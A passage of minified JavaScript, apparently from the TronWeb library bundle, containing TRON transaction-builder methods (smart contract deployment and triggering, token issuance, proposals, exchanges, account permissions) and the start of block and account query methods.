        const {rawParameter: B, funcABIV2: P, parametersV2: O} = e;
        if (B && fo(B))
            p = B.replace(/^(0x)/, "");
        else if (P)
            p = g1(P, O).replace(/^(0x)/, "");
        else {
            let k = x.find(H => H.type === "constructor");
            if (typeof k < "u" && k) {
                const H = new Hc
                  , X = []
                  , Y = [];
                if (k = k.inputs,
                h.length != k.length)
                    throw new Error(`constructor needs ${k.length} but ${h.length} provided`);
                for (let V = 0; V < h.length; V++) {
                    let R = k[V].type
                      , _ = h[V];
                    if (!R || !fo(R) || !R.length)
                        throw new Error("Invalid parameter type provided: " + R);
                    const $ = z => qf(z) ? z.map(K => $(K)) : gt(z).replace(Ld, "0x");
                    R === "address" || ((W = R.match(/^([^\x5b]*)(\x5b|$)/)) == null ? void 0 : W[0]) === "address[" ? _ = $(_) : /trcToken/.test(R) && (R = R.replace(/trcToken/, "uint256")),
                    X.push(R),
                    Y.push(_)
                }
                try {
                    p = H.encode(X, Y).replace(/^(0x)/, "")
                } catch (V) {
                    throw new Error(V)
                }
            } else
                p = ""
        }
        const F = {
            owner_address: gt(t),
            fee_limit: parseInt(o),
            call_value: parseInt(s),
            consume_user_resource_percent: i,
            origin_energy_limit: n,
            abi: JSON.stringify(x),
            bytecode: b,
            parameter: p,
            name: v
        };
        co(a) && (F.call_token_value = parseInt(a)),
        co(l) && (F.token_id = parseInt(l));
        const D = {};
        D.owner_address = F.owner_address,
        co(F.call_token_value) && (D.call_token_value = F.call_token_value),
        co(F.token_id) && (D.token_id = F.token_id);
        const I = D.new_contract = {};
        F.abi ? I.abi = {
            entrys: JSON.parse(F.abi)
        } : I.abi = {},
        F.call_value && (I.call_value = F.call_value),
        I.consume_user_resource_percent = F.consume_user_resource_percent,
        I.origin_energy_limit = F.origin_energy_limit,
        I.origin_address = F.origin_address ?? F.owner_address,
        F.bytecode + F.parameter && (I.bytecode = (F.bytecode + F.parameter).replace(/^0x/, "")),
        co(F.name) && (I.name = F.name);
        const M = ur(e)
          , C = await cr(this.tronWeb, nr.CreateSmartContract, D, e == null ? void 0 : e.permissionId, {
            ...M,
            fee_limit: F.fee_limit
        });
        return C.contract_address = Qye(F.owner_address, C.txID),
        C
    }
    async triggerSmartContract(e, t, o, i, n) {
        var a;
        const s = [e, t, o, i, n];
        return typeof s[2] != "object" && (s[2] = {
            feeLimit: s[2],
            callValue: s[3]
        },
        s.splice(3, 1)),
        (a = s[2]) != null && a.txLocal ? this._triggerSmartContractLocal(...s) : this._triggerSmartContract(...s)
    }
    async triggerConstantContract(e, t, o={}, i=[], n=this.tronWeb.defaultAddress.hex) {
        return o._isConstant = !0,
        this._triggerSmartContract(e, t, o, i, n)
    }
    async triggerConfirmedConstantContract(e, t, o={}, i=[], n=this.tronWeb.defaultAddress.hex) {
        return o._isConstant = !0,
        o.confirmed = !0,
        this._triggerSmartContract(e, t, o, i, n)
    }
    async estimateEnergy(e, t, o={}, i=[], n=this.tronWeb.defaultAddress.hex) {
        return o.estimateEnergy = !0,
        await this._triggerSmartContract(e, t, o, i, n)
    }
    async deployConstantContract(e={
        input: "",
        ownerAddress: ""
    }) {
        const {input: t, ownerAddress: o, tokenId: i, tokenValue: n, callValue: s=0} = e;
        this.validator.notValid([{
            name: "input",
            type: "not-empty-string",
            value: t
        }, {
            name: "callValue",
            type: "integer",
            value: s,
            gte: 0
        }, {
            name: "owner",
            type: "address",
            value: o
        }, {
            name: "tokenValue",
            type: "integer",
            value: n,
            gte: 0,
            optional: !0
        }, {
            name: "tokenId",
            type: "integer",
            value: i,
            gte: 0,
            optional: !0
        }]);
        const a = {
            data: t,
            owner_address: gt(o),
            call_value: s
        };
        i && (a.token_id = i),
        n && (a.call_token_value = n);
        const l = `wallet${e.confirmed ? "solidity" : ""}/estimateenergy`
          , f = await this.tronWeb[e.confirmed ? "solidityNode" : "fullNode"].request(l, a, "post");
        if (f.Error)
            throw new Error(f.Error);
        if (f.result && f.result.message)
            throw new Error(this.tronWeb.toUtf8(f.result.message));
        return f
    }
    _getTriggerSmartContractArgs(e, t, o, i, n, s, a, l, f) {
        var p;
        const h = {
            contract_address: gt(e),
            owner_address: gt(n)
        };
        if (t && fo(t)) {
            t = t.replace(/\s*/g, "");
            let b;
            if (i.length) {
                const v = new Hc;
                let T = [];
                const x = [];
                for (let E = 0; E < i.length; E++) {
                    let {value: B} = i[E];
                    const {type: P} = i[E];
                    if (!P || !fo(P) || !P.length)
                        throw new Error("Invalid parameter type provided: " + P);
                    const O = F => qf(F) ? F.map(D => O(D)) : gt(F).replace(Ld, "0x");
                    (P === "address" || ((p = P.match(/^([^\x5b]*)(\x5b|$)/)) == null ? void 0 : p[0]) === "address[") && (B = O(B)),
                    T.push(P),
                    x.push(B)
                }
                try {
                    T = T.map(E => (/trcToken/.test(E) && (E = E.replace(/trcToken/, "uint256")),
                    E)),
                    b = v.encode(T, x).replace(/^(0x)/, "")
                } catch (E) {
                    throw new Error(E)
                }
            } else
                b = "";
            o.funcABIV2 && (b = g1(o.funcABIV2, o.parametersV2).replace(/^(0x)/, "")),
            o.shieldedParameter && fo(o.shieldedParameter) && (b = o.shieldedParameter.replace(/^(0x)/, "")),
            o.rawParameter && fo(o.rawParameter) && (b = o.rawParameter.replace(/^(0x)/, "")),
            h.function_selector = t,
            h.parameter = b
        } else
            o.input && (h.data = o.input);
        return h.call_value = parseInt(l),
        co(s) && (h.call_token_value = parseInt(s)),
        co(a) && (h.token_id = parseInt(a)),
        o._isConstant || o.estimateEnergy || (h.fee_limit = parseInt(f)),
        o.permissionId && (h.Permission_id = o.permissionId),
        h
    }
    async _triggerSmartContractLocal(e, t, o={}, i=[], n=this.tronWeb.defaultAddress.hex) {
        const {tokenValue: s, tokenId: a, callValue: l, feeLimit: f} = Object.assign({
            callValue: 0,
            feeLimit: this.tronWeb.feeLimit
        }, o);
        this.validator.notValid([{
            name: "feeLimit",
            type: "integer",
            value: f,
            gt: 0
        }, {
            name: "callValue",
            type: "integer",
            value: l,
            gte: 0
        }, {
            name: "parameters",
            type: "array",
            value: i
        }, {
            name: "contract",
            type: "address",
            value: e
        }, {
            name: "issuer",
            type: "address",
            value: n,
            optional: !0
        }, {
            name: "tokenValue",
            type: "integer",
            value: s,
            gte: 0,
            optional: !0
        }, {
            name: "tokenId",
            type: "integer",
            value: a,
            gte: 0,
            optional: !0
        }]);
        const h = this._getTriggerSmartContractArgs(e, t, o, i, n, s, a, l, f);
        h.function_selector && (h.data = ir(Buffer.from(h.function_selector, "utf-8")).toString().substring(2, 10) + h.parameter);
        const p = {
            data: h.data,
            owner_address: h.owner_address,
            contract_address: h.contract_address
        };
        h.call_value && (p.call_value = h.call_value),
        h.call_token_value && (p.call_token_value = h.call_token_value),
        h.token_id && (p.token_id = h.token_id);
        const b = ur(o)
          , v = await cr(this.tronWeb, nr.TriggerSmartContract, p, o.permissionId, {
            ...b,
            fee_limit: h.fee_limit
        });
        return {
            result: {
                result: !0
            },
            transaction: v
        }
    }
    async _triggerSmartContract(e, t, o={}, i=[], n=this.tronWeb.defaultAddress.hex) {
        const {tokenValue: s, tokenId: a, callValue: l, feeLimit: f} = Object.assign({
            callValue: 0,
            feeLimit: this.tronWeb.feeLimit
        }, o);
        this.validator.notValid([{
            name: "feeLimit",
            type: "integer",
            value: f,
            gt: 0
        }, {
            name: "callValue",
            type: "integer",
            value: l,
            gte: 0
        }, {
            name: "parameters",
            type: "array",
            value: i
        }, {
            name: "contract",
            type: "address",
            value: e
        }, {
            name: "issuer",
            type: "address",
            value: n,
            optional: !0
        }, {
            name: "tokenValue",
            type: "integer",
            value: s,
            gte: 0,
            optional: !0
        }, {
            name: "tokenId",
            type: "integer",
            value: a,
            gte: 0,
            optional: !0
        }]);
        const h = this._getTriggerSmartContractArgs(e, t, o, i, n, s, a, l, f);
        let p = "triggersmartcontract";
        o._isConstant ? p = "triggerconstantcontract" : o.estimateEnergy && (p = "estimateenergy"),
        p = `wallet${o.confirmed ? "solidity" : ""}/${p}`;
        const b = await this.tronWeb[o.confirmed ? "solidityNode" : "fullNode"].request(p, h, "post");
        return Jye(b, h, o)
    }
    async clearABI(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        if (!or.isAddress(e))
            throw new Error("Invalid contract address provided");
        if (!or.isAddress(t))
            throw new Error("Invalid owner address provided");
        const i = {
            contract_address: gt(e),
            owner_address: gt(t)
        };
        this.tronWeb.trx.cache.contracts[e] && delete this.tronWeb.trx.cache.contracts[e];
        const n = ur(o);
        return cr(this.tronWeb, nr.ClearABIContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async updateBrokerage(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        if (!co(e))
            throw new Error("Invalid brokerage provided");
        if (!Dc(e) || e < 0 || e > 100)
            throw new Error("Brokerage must be an integer between 0 and 100");
        if (!or.isAddress(t))
            throw new Error("Invalid owner address provided");
        const i = {
            brokerage: parseInt(e),
            owner_address: gt(t)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.UpdateBrokerageContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async createToken(e={}, t=this.tronWeb.defaultAddress.hex) {
        const {name: o=!1, abbreviation: i=!1, description: n="", url: s=!1, totalSupply: a=0, trxRatio: l=1, tokenRatio: f=1, saleStart: h=Date.now(), saleEnd: p=!1, freeBandwidth: b=0, freeBandwidthLimit: v=0, frozenAmount: T=0, frozenDuration: x=0, voteScore: E, precision: B} = e;
        if (this.validator.notValid([{
            name: "Supply amount",
            type: "positive-integer",
            value: a
        }, {
            name: "TRX ratio",
            type: "positive-integer",
            value: l
        }, {
            name: "Token ratio",
            type: "positive-integer",
            value: f
        }, {
            name: "token abbreviation",
            type: "string",
            value: i,
            lte: 32,
            gt: 0
        }, {
            name: "token name",
            type: "not-empty-string",
            value: o
        }, {
            name: "token description",
            type: "string",
            value: n,
            lte: 200
        }, {
            name: "token url",
            type: "url",
            value: s
        }, {
            name: "token url",
            type: "string",
            value: s,
            lte: 256
        }, {
            name: "issuer",
            type: "address",
            value: t
        }, {
            name: "sale start timestamp",
            type: "integer",
            value: h,
            gte: Date.now()
        }, {
            name: "sale end timestamp",
            type: "integer",
            value: p,
            gt: h
        }, {
            name: "Frozen supply",
            type: "integer",
            value: T,
            gte: 0
        }, {
            name: "Frozen duration",
            type: "integer",
            value: x,
            gte: 0
        }]),
        co(E) && (!Dc(E) || E <= 0))
            throw new Error("voteScore must be a positive integer greater than 0");
        if (co(B) && (!Dc(B) || B < 0 || B > 6))
            throw new Error("precision must be a positive integer >= 0 and <= 6");
        const P = {
            owner_address: gt(t),
            name: ao(o),
            abbr: ao(i),
            description: ao(n),
            url: ao(s),
            total_supply: parseInt(a),
            trx_num: parseInt(l),
            num: parseInt(f),
            start_time: parseInt(h),
            end_time: parseInt(p),
            frozen_supply: [{
                frozen_amount: parseInt(T),
                frozen_days: parseInt(x)
            }]
        };
        ["name", "abbr", "description", "url"].forEach(F => {
            P[F] || delete P[F]
        }
        ),
        parseInt(T) > 0 || delete P.frozen_supply,
        b && !isNaN(parseInt(b)) && parseInt(b) >= 0 && (P.free_asset_net_limit = parseInt(b)),
        v && !isNaN(parseInt(v)) && parseInt(v) >= 0 && (P.public_free_asset_net_limit = parseInt(v)),
        B && !isNaN(parseInt(B)) && (P.precision = parseInt(B)),
        E && !isNaN(parseInt(E)) && (P.vote_score = parseInt(E));
        const O = ur(e);
        return cr(this.tronWeb, nr.AssetIssueContract, P, e == null ? void 0 : e.permissionId, O)
    }
    async createAccount(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        this.validator.notValid([{
            name: "account",
            type: "address",
            value: e
        }, {
            name: "origin",
            type: "address",
            value: t
        }]);
        const i = {
            owner_address: gt(t),
            account_address: gt(e)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.AccountCreateContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async updateAccount(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        this.validator.notValid([{
            name: "Name",
            type: "string",
            lte: 200,
            gt: 0,
            value: e,
            msg: "Invalid accountName"
        }, {
            name: "origin",
            type: "address",
            value: t
        }]);
        const i = {
            account_name: ao(e),
            owner_address: gt(t)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.AccountUpdateContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async setAccountId(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        e && fo(e) && e.startsWith("0x") && (e = e.slice(2)),
        this.validator.notValid([{
            name: "accountId",
            type: "hex",
            value: e
        }, {
            name: "accountId",
            type: "string",
            lte: 32,
            gte: 8,
            value: e
        }, {
            name: "origin",
            type: "address",
            value: t
        }]);
        const i = {
            account_id: e,
            owner_address: gt(t)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.SetAccountIdContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async updateToken(e={}, t=this.tronWeb.defaultAddress.hex) {
        const {description: o="", url: i=!1, freeBandwidth: n=0, freeBandwidthLimit: s=0} = e;
        this.validator.notValid([{
            name: "token description",
            type: "string",
            value: o,
            lte: 200
        }, {
            name: "token url",
            type: "url",
            value: i
        }, {
            name: "token url",
            type: "string",
            value: i,
            lte: 256
        }, {
            name: "issuer",
            type: "address",
            value: t
        }]);
        const a = {
            owner_address: gt(t),
            description: ao(o),
            url: ao(i)
        };
        n && !isNaN(parseInt(n)) && parseInt(n) >= 0 && (a.new_limit = parseInt(n)),
        s && !isNaN(parseInt(s)) && parseInt(s) >= 0 && (a.new_public_limit = parseInt(s));
        const l = ur(e);
        return cr(this.tronWeb, nr.UpdateAssetContract, a, e == null ? void 0 : e.permissionId, l)
    }
    async sendAsset(e, t=0, o, i=this.tronWeb.defaultAddress.hex, n={}) {
        return this.sendToken(e, t, o, i, n)
    }
    async purchaseAsset(e, t, o=0, i=this.tronWeb.defaultAddress.hex, n={}) {
        return this.purchaseToken(e, t, o, i, n)
    }
    async createAsset(e, t) {
        return this.createToken(e, t)
    }
    async updateAsset(e={}, t=this.tronWeb.defaultAddress.hex) {
        return this.updateToken(e, t)
    }
    async createProposal(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        this.validator.notValid([{
            name: "issuer",
            type: "address",
            value: t
        }]);
        const i = "Invalid proposal parameters provided";
        if (!e)
            throw new Error(i);
        const n = qf(e) ? e : [e];
        for (const l of n)
            if (!B0(l))
                throw new Error(i);
        const s = {
            owner_address: gt(t),
            parameters: n
        }
          , a = ur(o);
        return cr(this.tronWeb, nr.ProposalCreateContract, s, o == null ? void 0 : o.permissionId, a)
    }
    async deleteProposal(e, t=this.tronWeb.defaultAddress.hex, o={}) {
        this.validator.notValid([{
            name: "issuer",
            type: "address",
            value: t
        }, {
            name: "proposalID",
            type: "integer",
            value: e,
            gte: 0
        }]);
        const i = {
            owner_address: gt(t),
            proposal_id: parseInt(e)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.ProposalDeleteContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async voteProposal(e, t=!1, o=this.tronWeb.defaultAddress.hex, i={}) {
        this.validator.notValid([{
            name: "voter",
            type: "address",
            value: o
        }, {
            name: "proposalID",
            type: "integer",
            value: e,
            gte: 0
        }, {
            name: "has approval",
            type: "boolean",
            value: t
        }]);
        const n = {
            owner_address: gt(o),
            proposal_id: parseInt(e),
            is_add_approval: t
        }
          , s = ur(i);
        return cr(this.tronWeb, nr.ProposalApproveContract, n, i == null ? void 0 : i.permissionId, s)
    }
    async createTRXExchange(e, t, o, i=this.tronWeb.defaultAddress.hex, n={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: i
        }, {
            name: "token name",
            type: "not-empty-string",
            value: e
        }, {
            name: "token balance",
            type: "positive-integer",
            value: t
        }, {
            name: "trx balance",
            type: "positive-integer",
            value: o
        }]);
        const s = {
            owner_address: gt(i),
            first_token_id: ao(e),
            first_token_balance: t,
            second_token_id: "5f",
            second_token_balance: o
        }
          , a = ur(n);
        return cr(this.tronWeb, nr.ExchangeCreateContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async createTokenExchange(e, t, o, i, n=this.tronWeb.defaultAddress.hex, s={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: n
        }, {
            name: "first token name",
            type: "not-empty-string",
            value: e
        }, {
            name: "second token name",
            type: "not-empty-string",
            value: o
        }, {
            name: "first token balance",
            type: "positive-integer",
            value: t
        }, {
            name: "second token balance",
            type: "positive-integer",
            value: i
        }]);
        const a = {
            owner_address: gt(n),
            first_token_id: ao(e),
            first_token_balance: t,
            second_token_id: ao(o),
            second_token_balance: i
        }
          , l = ur(s);
        return cr(this.tronWeb, nr.ExchangeCreateContract, a, s == null ? void 0 : s.permissionId, l)
    }
    async injectExchangeTokens(e, t, o, i=this.tronWeb.defaultAddress.hex, n={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: i
        }, {
            name: "token name",
            type: "not-empty-string",
            value: t
        }, {
            name: "token amount",
            type: "integer",
            value: o,
            gte: 1
        }, {
            name: "exchangeID",
            type: "integer",
            value: e,
            gte: 0
        }]);
        const s = {
            owner_address: gt(i),
            exchange_id: parseInt(e),
            token_id: ao(t),
            quant: parseInt(o)
        }
          , a = ur(n);
        return cr(this.tronWeb, nr.ExchangeInjectContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async withdrawExchangeTokens(e, t, o, i=this.tronWeb.defaultAddress.hex, n={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: i
        }, {
            name: "token name",
            type: "not-empty-string",
            value: t
        }, {
            name: "token amount",
            type: "integer",
            value: o,
            gte: 1
        }, {
            name: "exchangeID",
            type: "integer",
            value: e,
            gte: 0
        }]);
        const s = {
            owner_address: gt(i),
            exchange_id: parseInt(e),
            token_id: ao(t),
            quant: parseInt(o)
        }
          , a = ur(n);
        return cr(this.tronWeb, nr.ExchangeWithdrawContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async tradeExchangeTokens(e, t, o, i, n=this.tronWeb.defaultAddress.hex, s={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: n
        }, {
            name: "token name",
            type: "not-empty-string",
            value: t
        }, {
            name: "tokenAmountSold",
            type: "integer",
            value: o,
            gte: 1
        }, {
            name: "tokenAmountExpected",
            type: "integer",
            value: i,
            gte: 1
        }, {
            name: "exchangeID",
            type: "integer",
            value: e,
            gte: 0
        }]);
        const a = {
            owner_address: gt(n),
            exchange_id: parseInt(e),
            token_id: or.fromAscii(t).replace(/^0x/, ""),
            quant: parseInt(o),
            expected: parseInt(i)
        }
          , l = ur(s);
        return cr(this.tronWeb, nr.ExchangeTransactionContract, a, s == null ? void 0 : s.permissionId, l)
    }
    async updateSetting(e, t, o=this.tronWeb.defaultAddress.hex, i={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: o
        }, {
            name: "contract",
            type: "address",
            value: e
        }, {
            name: "userFeePercentage",
            type: "integer",
            value: t,
            gte: 0,
            lte: 100
        }]);
        const n = {
            owner_address: gt(o),
            contract_address: gt(e),
            consume_user_resource_percent: t
        }
          , s = ur(i);
        return cr(this.tronWeb, nr.UpdateSettingContract, n, i == null ? void 0 : i.permissionId, s)
    }
    async updateEnergyLimit(e, t=0, o=this.tronWeb.defaultAddress.hex, i={}) {
        this.validator.notValid([{
            name: "owner",
            type: "address",
            value: o
        }, {
            name: "contract",
            type: "address",
            value: e
        }, {
            name: "originEnergyLimit",
            type: "integer",
            value: t,
            gte: 0,
            lte: 1e7
        }]);
        const n = {
            owner_address: gt(o),
            contract_address: gt(e),
            origin_energy_limit: t
        }
          , s = ur(i);
        return cr(this.tronWeb, nr.UpdateEnergyLimitContract, n, i == null ? void 0 : i.permissionId, s)
    }
    checkPermissions(e, t) {
        if (e) {
            if (e.type !== t || !e.permission_name || !fo(e.permission_name) || !Dc(e.threshold) || e.threshold < 1 || !e.keys)
                return !1;
            for (const o of e.keys)
                if (!or.isAddress(o.address) || !Dc(o.weight) || o.weight > e.threshold || o.weight < 1 || t === 2 && !e.operations)
                    return !1
        }
        return !0
    }
    async updateAccountPermissions(e=this.tronWeb.defaultAddress.hex, t, o, i, n={}) {
        var l;
        if (!or.isAddress(e))
            throw new Error("Invalid ownerAddress provided");
        if (!this.checkPermissions(t, 0))
            throw new Error("Invalid ownerPermissions provided");
        if (!this.checkPermissions(o, 1))
            throw new Error("Invalid witnessPermissions provided");
        Array.isArray(i) || (i = [i]);
        for (const f of i)
            if (!this.checkPermissions(f, 2))
                throw new Error("Invalid activesPermissions provided");
        const s = {
            owner_address: gt(e)
        };
        if (t) {
            const f = tE(t);
            "type"in f && delete f.type,
            f.keys = (l = f.keys) == null ? void 0 : l.map( ({address: h, weight: p}) => ({
                address: this.tronWeb.address.toHex(h),
                weight: p
            })),
            s.owner = f
        }
        if (o) {
            const f = tE(o);
            f.type = "Witness",
            f.keys = f.keys.map( ({address: h, weight: p}) => ({
                address: this.tronWeb.address.toHex(h),
                weight: p
            })),
            s.witness = f
        }
        if (i) {
            const f = tE(i);
            f.forEach(h => {
                h.type = "Active"
            }
            ),
            f.forEach(h => {
                h.keys = h.keys.map( ({address: p, weight: b}) => ({
                    address: this.tronWeb.address.toHex(p),
                    weight: b
                }))
            }
            ),
            s.actives = f
        }
        const a = ur(n);
        return cr(this.tronWeb, nr.AccountPermissionUpdateContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async newTxID(e, t={}) {
        if (t != null && t.txLocal) {
            const o = e.raw_data.contract[0];
            try {
                const i = await cr(this.tronWeb, o.type, o.parameter.value, o.Permission_id, {
                    fee_limit: e.raw_data.fee_limit,
                    data: e.raw_data.data,
                    ref_block_bytes: e.raw_data.ref_block_bytes,
                    ref_block_hash: e.raw_data.ref_block_hash,
                    expiration: e.raw_data.expiration,
                    timestamp: e.raw_data.timestamp
                });
                return i.signature = e.signature,
                i.visible = e.visible,
                i
            } catch {
                throw new Error("Error generating a new transaction id.")
            }
        }
        try {
            const o = await this.tronWeb.fullNode.request("wallet/getsignweight", e, "post");
            return typeof e.visible == "boolean" && (o.transaction.transaction.visible = e.visible),
            Xye(o.transaction.transaction, {
                ...e.raw_data.contract[0].parameter.value,
                Permission_id: e.raw_data.contract[0].Permission_id
            }, {
                data: e.raw_data.data,
                fee_limit: e.raw_data.fee_limit
            })
        } catch {
            throw new Error("Error generating a new transaction id.")
        }
    }
    async alterTransaction(e, t={}) {
        if (Reflect.has(e, "signature"))
            throw new Error("You can not extend the expiration of a signed transaction.");
        if (t.data) {
            if (t.dataFormat !== "hex" && (t.data = or.toHex(t.data)),
            t.data = t.data.replace(/^0x/, ""),
            t.data.length === 0)
                throw new Error("Invalid data provided");
            e.raw_data.data = t.data
        }
        if (t.extension) {
            if (t.extension = parseInt(t.extension * 1e3),
            isNaN(t.extension) || e.raw_data.expiration + t.extension <= Date.now() + 3e3)
                throw new Error("Invalid extension provided");
            e.raw_data.expiration += t.extension
        }
        return await this.newTxID(e, {
            txLocal: t.txLocal
        })
    }
    async extendExpiration(e, t, o={}) {
        return await this.alterTransaction(e, {
            extension: t,
            txLocal: o == null ? void 0 : o.txLocal
        })
    }
    async addUpdateData(e, t, o="utf8", i={}) {
        return this.alterTransaction(e, {
            data: t,
            dataFormat: o,
            txLocal: i == null ? void 0 : i.txLocal
        })
    }
}
const AW = `TRON Signed Message:
32`
  , PW = `Ethereum Signed Message:
32`;
function Sc(r) {
    return or.address.toHex(r)
}
class Ca {
    constructor(e) {
        we(this, "tronWeb");
        we(this, "cache");
        we(this, "validator");
        we(this, "signMessage");
        we(this, "sendAsset");
        we(this, "send");
        we(this, "sendTrx");
        we(this, "broadcast");
        we(this, "broadcastHex");
        we(this, "signTransaction");
        this.tronWeb = e,
        this.cache = {
            contracts: {}
        },
        this.validator = new TU,
        this.signMessage = this.sign,
        this.sendAsset = this.sendToken,
        this.send = this.sendTransaction,
        this.sendTrx = this.sendTransaction,
        this.broadcast = this.sendRawTransaction,
        this.broadcastHex = this.sendHexTransaction,
        this.signTransaction = this.sign
    }
    _parseToken(e) {
        return {
            ...e,
            name: this.tronWeb.toUtf8(e.name),
            abbr: e.abbr && this.tronWeb.toUtf8(e.abbr),
            description: e.description && this.tronWeb.toUtf8(e.description),
            url: e.url && this.tronWeb.toUtf8(e.url)
        }
    }
    getCurrentBlock() {
        return this.tronWeb.fullNode.request("wallet/getnowblock")
    }
    getConfirmedCurrentBlock() {
        return this.tronWeb.solidityNode.request("walletsolidity/getnowblock")
    }
    async getBlock(e=this.tronWeb.defaultBlock) {
        if (e === !1)
            throw new Error("No block identifier provided");
        return e == "earliest" && (e = 0),
        e == "latest" ? this.getCurrentBlock() : isNaN(+e) && tt.isHex(e.toString()) ? this.getBlockByHash(e) : this.getBlockByNumber(e)
    }
    async getBlockByHash(e) {
        const t = await this.tronWeb.fullNode.request("wallet/getblockbyid", {
            value: e
        }, "post");
        if (!Object.keys(t).length)
            throw new Error("Block not found");
        return t
    }
    async getBlockByNumber(e) {
        if (!tt.isInteger(e) || e < 0)
            throw new Error("Invalid block number provided");
        return this.tronWeb.fullNode.request("wallet/getblockbynum", {
            num: parseInt(e)
        }, "post").then(t => {
            if (!Object.keys(t).length)
                throw new Error("Block not found");
            return t
        }
        )
    }
    async getBlockTransactionCount(e=this.tronWeb.defaultBlock) {
        const {transactions: t=[]} = await this.getBlock(e);
        return t.length
    }
    async getTransactionFromBlock(e=this.tronWeb.defaultBlock, t) {
        const {transactions: o} = await this.getBlock(e);
        if (!o)
            throw new Error("Transaction not found in block");
        if (t >= 0 && t < o.length)
            return o[t];
        throw new Error("Invalid transaction index provided")
    }
    async getTransactionsFromBlock(e=this.tronWeb.defaultBlock) {
        const {transactions: t} = await this.getBlock(e);
        if (!t)
            throw new Error("Transaction not found in block");
        return t
    }
    async getTransaction(e) {
        const t = await this.tronWeb.fullNode.request("wallet/gettransactionbyid", {
            value: e
        }, "post");
        if (!Object.keys(t).length)
            throw new Error("Transaction not found");
        return t
    }
    async getConfirmedTransaction(e) {
        const t = await this.tronWeb.solidityNode.request("walletsolidity/gettransactionbyid", {
            value: e
        }, "post");
        if (!Object.keys(t).length)
            throw new Error("Transaction not found");
        return t
    }
    getUnconfirmedTransactionInfo(e) {
        return this.tronWeb.fullNode.request("wallet/gettransactioninfobyid", {
            value: e
        }, "post")
    }
    getTransactionInfo(e) {
        return this.tronWeb.solidityNode.request("walletsolidity/gettransactioninfobyid", {
            value: e
        }, "post")
    }
    getTransactionsToAddress(e=this.tronWeb.defaultAddress.hex, t=30, o=0) {
        return this.getTransactionsRelated(this.tronWeb.address.toHex(e), "to", t, o)
    }
    getTransactionsFromAddress(e=this.tronWeb.defaultAddress.hex, t=30, o=0) {
        return this.getTransactionsRelated(this.tronWeb.address.toHex(e), "from", t, o)
    }
    async getTransactionsRelated(e=this.tronWeb.defaultAddress.hex, t="all", o=30, i=0) {
        if (this.tronWeb.fullnodeSatisfies(">=4.1.1"))
            throw new Error("This api is not supported any more");
        if (!["to", "from", "all"].includes(t))
            throw new Error('Invalid direction provided: Expected "to", "from" or "all"');
        if (t == "all") {
            const [n,s] = await Promise.all([this.getTransactionsRelated(e, "from", o, i), this.getTransactionsRelated(e, "to", o, i)]);
            return [...n.map(a => (a.direction = "from",
            a)), ...s.map(a => (a.direction = "to",
            a))].sort( (a, l) => l.raw_data.timestamp - a.raw_data.timestamp)
        }
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        if (!tt.isInteger(o) || o < 0 || i && o < 1)
            throw new Error("Invalid limit provided");
        if (!tt.isInteger(i) || i < 0)
            throw new Error("Invalid offset provided");
        return e = this.tronWeb.address.toHex(e),
        this.tronWeb.solidityNode.request(`walletextension/gettransactions${t}this`, {
            account: {
                address: e
            },
            offset: i,
            limit: o
        }, "post").then( ({transaction: n}) => n)
    }
    async getAccount(e=this.tronWeb.defaultAddress.hex) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return e = this.tronWeb.address.toHex(e),
        this.tronWeb.solidityNode.request("walletsolidity/getaccount", {
            address: e
        }, "post")
    }
    getAccountById(e) {
        return this.getAccountInfoById(e, {
            confirmed: !0
        })
    }
    async getAccountInfoById(e, t) {
        return this.validator.notValid([{
            name: "accountId",
            type: "hex",
            value: e
        }, {
            name: "accountId",
            type: "string",
            lte: 32,
            gte: 8,
            value: e
        }]),
        e.startsWith("0x") && (e = e.slice(2)),
        this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request(`wallet${t.confirmed ? "solidity" : ""}/getaccountbyid`, {
            account_id: e
        }, "post")
    }
    async getBalance(e=this.tronWeb.defaultAddress.hex) {
        const {balance: t=0} = await this.getAccount(e);
        return t
    }
    async getUnconfirmedAccount(e=this.tronWeb.defaultAddress.hex) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return e = this.tronWeb.address.toHex(e),
        this.tronWeb.fullNode.request("wallet/getaccount", {
            address: e
        }, "post")
    }
    getUnconfirmedAccountById(e) {
        return this.getAccountInfoById(e, {
            confirmed: !1
        })
    }
    async getUnconfirmedBalance(e=this.tronWeb.defaultAddress.hex) {
        const {balance: t=0} = await this.getUnconfirmedAccount(e);
        return t
    }
    async getBandwidth(e=this.tronWeb.defaultAddress.hex) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return e = this.tronWeb.address.toHex(e),
        this.tronWeb.fullNode.request("wallet/getaccountnet", {
            address: e
        }, "post").then( ({freeNetUsed: t=0, freeNetLimit: o=0, NetUsed: i=0, NetLimit: n=0}) => o - t + (n - i))
    }
    async getTokensIssuedByAddress(e=this.tronWeb.defaultAddress.hex) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
